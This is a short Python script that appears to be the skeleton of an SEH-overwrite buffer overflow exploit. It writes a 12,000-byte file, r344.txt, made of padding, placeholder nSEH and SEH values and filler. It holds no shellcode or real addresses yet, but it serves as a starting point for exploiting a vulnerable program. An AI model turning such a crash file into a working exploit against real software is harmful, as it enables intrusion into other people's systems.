#!/usr/bin/python

filename="r344.txt"

nSEH = "B" * 4
SEH  = "C" * 4

buffer  = "A" * 900
buffer += nSEH
buffer += SEH
buffer += "D" * (12000 - len(buffer))

textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()


